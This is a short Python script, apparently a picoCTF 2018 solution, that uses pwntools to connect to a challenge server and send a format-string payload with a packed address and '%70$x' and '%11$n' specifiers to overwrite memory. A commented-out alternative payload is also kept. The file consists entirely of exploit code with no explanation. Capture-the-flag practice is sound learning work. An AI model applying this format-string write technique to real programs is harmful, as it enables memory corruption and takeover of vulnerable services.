from pwn import *

nc = remote('2018shell.picoctf.com', 27114)
nc.recvuntil("(yes/no)\n")

#payload = p32(0x080486f1) + '%70x%11$n'
payload = p32(0x080486f2)
payload += '%70$x'
payload += '%11$n'
print payload

nc.sendline(payload)

print nc.recvall()

